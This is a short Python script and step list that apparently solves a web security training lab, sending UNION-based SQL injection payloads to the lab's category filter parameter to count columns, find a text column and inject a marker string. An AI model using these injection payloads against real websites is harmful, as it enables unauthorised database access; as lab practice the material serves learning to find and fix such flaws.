#!/usr/bin/env python3

import requests, re

URL = 'https://0ab400960305de8a82d3c5cc008100ba.web-security-academy.net/filter'

def run(payload):
    r = requests.get(URL, params={'category': payload})
    body = r.text
    print(f'[*] Payload: {payload}')
    print(f'[*] Status: {r.status_code}')

    if r.status_code == 500:
        print('[!] Error → SQL confirmed / bad syntax')

    if re.search(r'Congratulations|solved the lab', body):
        print('[✓] SOLVED')

    hint = re.findall(r'<p id="hint">(.*?)</p>', body)
    if hint:
        print(f'[*] Hint: {hint[0]}')

    items = re.findall(r'<th>(.*?)</th>', body)
    if items:
        print(f'[✓] Found {len(items)} list:')
    for item in items:
        clean = item.strip()
        if clean:
            print(f' → {clean}')

run("Gifts' union select null, 'J2fOaw', null--")


"""
Steps to Reproduce

1. Open browser and access to this endpoint:`/filter?category=Gifts`
2. Determine sql injection by use this patload: `Gifts'--`.
3. Determine how may columns by use this patload: `Gifts' order by 3--` (Found 3 columns).
4. Determine which column are contain text by use this patload: `Gifts' union select null, 'hack', null--` (Column 2 is contain text).
5. Input string `J2fOaw` into the column 2 by use this patload: `GiftsGifts' union select null, 'J2fOaw', null--`.
"""